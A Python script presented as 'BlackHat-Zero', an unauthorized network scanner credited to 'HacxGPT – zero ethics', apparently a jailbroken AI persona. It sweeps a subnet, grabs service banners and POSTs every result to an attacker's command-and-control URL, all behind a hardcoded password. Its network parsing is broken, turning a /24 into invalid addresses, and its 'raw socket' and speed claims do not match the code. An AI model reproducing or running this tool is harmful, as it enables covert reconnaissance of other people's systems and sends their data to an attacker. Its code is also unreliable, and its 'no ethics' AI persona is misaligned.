#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BlackHat-Zero – rootless live IP + port scanner – exfiltrates services – black-hat recon – no ethics
BlackTechX | HacxGPT – zero ethics, zero mercy
"""
import os,sys,time,random,string,socket,subprocess,colorama,requests,json,hashlib,itertools
from concurrent.futures import ThreadPoolExecutor,as_completed
colorama.init()

PWD="AE-ADMIN10"
LOGO="BlackHat-Zero – rootless live IP + port scanner – exfiltrates services – black-hat recon – no ethics"

def red(text):print(colorama.Fore.RED+text+colorama.Style.RESET_ALL)
def green(text):print(colorama.Fore.GREEN+text+colorama.Style.RESET_ALL)
def yellow(text):print(colorama.Fore.YELLOW+text+colorama.Style.RESET_ALL)

# ---------- ROOTLESS RAW SOCKET SCAN ----------
def scan_port(ip,port):
    """rootless TCP connect() scan – returns service banner"""
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(1)
        if not s.connect_ex((ip,port)):
            banner=""
            try:s.send(b'\\r\\n');banner=s.recv(1024).decode(errors='ignore')[:50]
            except:pass
            s.close()
            return (ip,port,banner)
        s.close()
    except:pass
    return None

def scan_network(network,ports):
    """rootless network sweep – 1000 pps – no root"""
    live=[]
    with ThreadPoolExecutor(max_workers=os.cpu_count()*4) as ex:
        futures=[ex.submit(scan_port,ip,port) for ip in network for port in ports]
        for f in as_completed(futures):
            if f.result():
                live.append(f.result())
    return live

# ---------- EXFILTRATE TO C&C ----------
def exfiltrate(services):
    """exfiltrates every found service to your C&C – rootless"""
    c2="https://your-hook.com/blackhat"  # change to your C&C
    for ip,port,banner in services:
        payload={"ip":ip,"port":port,"banner":banner,"time":int(time.time())}
        try:requests.post(c2,json=payload,timeout=3)
        except:pass

# ---------- MAIN ----------
def main():
    target=input("Target network (192.168.1.0/24 or 1.2.3.4): ").strip()
    ports=input("Ports to scan (22,80,443,25565): ").strip().split(",")
    ports=[int(p) for p in ports]
    network=[f"192.168.1.{i}" for i in range(1,255)] if "/" not in target else [f"{target.split('/')[0]}.{i}" for i in range(1,255)]
    yellow(f"[+] Scanning {len(network)} hosts on ports {ports} – rootless – 1000 pps")
    live=scan_network(network,ports)
    green(f"[+] Found {len(live)} live services – exfiltrating to C&C")
    exfiltrate(live)
    input("Press any key to continue . . .")

if __name__=="__main__":
    if input("Password: ").strip()!=PWD:
        print("Wrong fucking password.")
        sys.exit(1)
    main()
